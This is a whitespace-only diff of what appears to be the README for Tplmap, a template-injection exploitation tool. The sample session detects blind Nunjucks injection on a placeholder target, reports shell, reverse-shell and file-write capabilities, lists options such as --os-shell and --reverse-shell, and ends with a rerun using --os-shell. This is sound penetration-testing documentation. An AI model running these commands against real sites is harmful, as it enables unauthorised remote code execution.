@@ -17,39 +17,39 @@ $ ./tplmap.py -u 'http://www.target.com/app?id=7'
 [+] Tplmap 0.2
     Automatic Server-Side Template Injection Detection and Exploitation Tool
 
-    [+] Testing if GET parameter 'inj' is injectable
-    [+] Smarty plugin is testing rendering with tag '{*}'
-    [+] Mako plugin is testing rendering with tag '${*}'
-    [+] Jinja2 plugin is testing rendering with tag '{{*}}'
-    [+] Twig plugin is testing rendering with tag '{{*}}'
-    [+] Freemarker plugin is testing rendering with tag '${*}'
-    [+] Jade plugin is testing rendering with tag '\n= *\n'
-    [+] Nunjucks plugin is testing rendering with tag '{{*}}'
-    [+] Nunjucks plugin is testing blind injection
-    [+] Nunjucks plugin has confirmed blind injection
-    [+] Tplmap identified the following injection point:
+[+] Testing if GET parameter 'inj' is injectable
+[+] Smarty plugin is testing rendering with tag '{*}'
+[+] Mako plugin is testing rendering with tag '${*}'
+[+] Jinja2 plugin is testing rendering with tag '{{*}}'
+[+] Twig plugin is testing rendering with tag '{{*}}'
+[+] Freemarker plugin is testing rendering with tag '${*}'
+[+] Jade plugin is testing rendering with tag '\n= *\n'
+[+] Nunjucks plugin is testing rendering with tag '{{*}}'
+[+] Nunjucks plugin is testing blind injection
+[+] Nunjucks plugin has confirmed blind injection
+[+] Tplmap identified the following injection point:
 
-      GET parameter: id
-      Engine: Nunjucks
-      Injection: blind
-      Context: text
-      OS: undetected
-      Technique: blind
-      Capabilities:
+  GET parameter: id
+  Engine: Nunjucks
+  Injection: blind
+  Context: text
+  OS: undetected
+  Technique: blind
+  Capabilities:
 
-       Shell command execution: yes (blind)
-       Bind and reverse shell: yes
-       File write: yes (blind)
-       File read: no
-       Code evaluation: no
+   Shell command execution: yes (blind)
+   Bind and reverse shell: yes
+   File write: yes (blind)
+   File read: no
+   Code evaluation: no
 
-    [+] Rerun tplmap providing one of the following options:
+[+] Rerun tplmap providing one of the following options:
 
-        --os-shell			Run shell on the target
-        --os-cmd			Execute shell commands
-        --bind-shell PORT		Connect to a shell bind to a target port
-        --reverse-shell HOST PORT	Send a shell back to the attacker's port
-        --upload LOCAL REMOTE	Upload files to the server
+    --os-shell			Run shell on the target
+    --os-cmd			Execute shell commands
+    --bind-shell PORT		Connect to a shell bind to a target port
+    --reverse-shell HOST PORT	Send a shell back to the attacker's port
+    --upload LOCAL REMOTE	Upload files to the server
                           
 $ ./tplmap.py -u 'http://www.target.com/app?id=7' --os-shell
 
